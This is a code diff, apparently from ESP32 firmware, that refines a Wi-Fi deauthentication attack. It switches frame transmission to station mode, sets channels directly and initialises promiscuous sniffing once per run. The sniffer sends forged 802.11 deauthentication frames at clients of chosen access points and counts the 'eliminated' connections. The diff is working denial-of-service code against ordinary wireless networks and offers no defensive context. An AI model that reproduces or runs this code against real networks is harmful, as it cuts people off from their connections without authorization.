@@ -27,7 +27,7 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (deauth_type == DEAUTH_TYPE_LIMITED) {
     if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
       memcpy(deauth_frame.station, mac_header->src, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
       eliminated_connections++;
     } else return;
   } else {
@@ -66,7 +66,7 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
   
     if (wifi_numbers.size() == 1) {
         int wifi_number = wifi_numbers[0]; // 获取第一个网络号
-        WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
+        esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE);
         memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
         memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
         esp_wifi_set_promiscuous(true);
@@ -76,16 +76,22 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
     }
     
     if (wifi_numbers.size() > 1)  {
+      bool isInitialized = false;
+      WiFi.softAPdisconnect();
+      WiFi.mode(WIFI_MODE_STA);
       while (!isBootButtonPressed_interrupt()) { 
         for (int wifi_number : wifi_numbers) {
           if (wifi_number >= 0) {
-            WiFi.softAP(WiFi.SSID(wifi_number), (const char*)NULL, WiFi.channel(wifi_number));
+            esp_wifi_set_channel(WiFi.channel(wifi_number), WIFI_SECOND_CHAN_NONE);
             memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
             memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
+            if (!isInitialized) {
             esp_wifi_set_promiscuous(true);
             esp_wifi_set_promiscuous_filter(&filt);
             esp_wifi_set_promiscuous_rx_cb(&sniffer);
-            delay(200);
+            isInitialized = true;
+            }
+            delay(20);
           }
         }
       }
